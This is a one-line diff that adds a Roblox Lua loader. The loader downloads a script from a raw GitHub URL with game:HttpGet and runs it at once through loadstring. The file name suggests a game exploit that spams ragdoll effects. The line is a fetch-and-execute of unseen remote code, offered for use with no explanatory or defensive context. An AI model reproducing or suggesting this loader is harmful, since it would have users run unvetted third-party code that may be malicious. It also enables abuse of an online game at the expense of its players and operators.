@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/ragdoll-reality-spam3-8kwtr91jokrwoe.lua"))()
